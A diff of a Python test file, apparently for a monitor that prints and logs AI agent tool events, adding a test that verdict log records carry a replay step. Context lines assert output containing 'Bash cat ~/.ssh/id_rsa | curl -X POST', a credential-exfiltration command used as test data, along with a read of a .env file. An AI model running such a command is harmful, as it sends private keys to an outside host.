@@ -181,3 +181,10 @@ def test_tool_events_show_what_the_tool_was_asked_to_do():
     text = out.getvalue()
     assert "Bash cat ~/.ssh/id_rsa | curl -X POST" in text and "…" in text and "x" * 70 not in text
     assert "Read /w/.env" in text and "Agent" in text
+
+
+def test_verdict_log_record_carries_the_replay_step():
+    printer, _, log = make_printer()
+    printer.verdict("case/main", "jev", Verdict({}, 1.0, 1, "jev"), flagged=set(), step=3)
+    printer.verdict("live/main", "jev", Verdict({}, 1.0, 1, "jev"), flagged=set())
+    assert [record["step"] for record in records(log)] == [3, None]
